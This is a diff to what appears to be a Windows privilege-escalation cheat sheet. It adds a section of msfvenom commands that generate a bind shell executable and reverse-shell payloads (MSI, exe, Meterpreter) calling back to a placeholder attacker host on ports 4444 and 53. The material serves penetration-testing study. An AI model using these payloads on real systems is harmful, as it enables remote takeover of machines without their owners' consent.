@@ -18,6 +18,20 @@ This is a comprehensive cheatsheet for privilege escalation techniques on Window
 - `icacls C:\path`
 
 
+## Msfvenom
+### Bind TCP Shell
+`msfvenom -p windows/shell/bind_tcp LPORT=4444 -f exe -o bind_shell.exe`
+
+### Reverse Shell(MSI)
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali_IP> LPORT=53 -f msi -o reverse.msi`
+
+### Reverse Shell(Command)
+`msfvenom -p windows/shell/reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o reverse_shell.exe`
+
+### Meterpreter
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o reverse_meterpreter.exe`
+
+
 ## 1 WEAK SERVICE PERMISSIONS  
 ────────────────────────────────────────────  
 ### To find services with weak permissions:
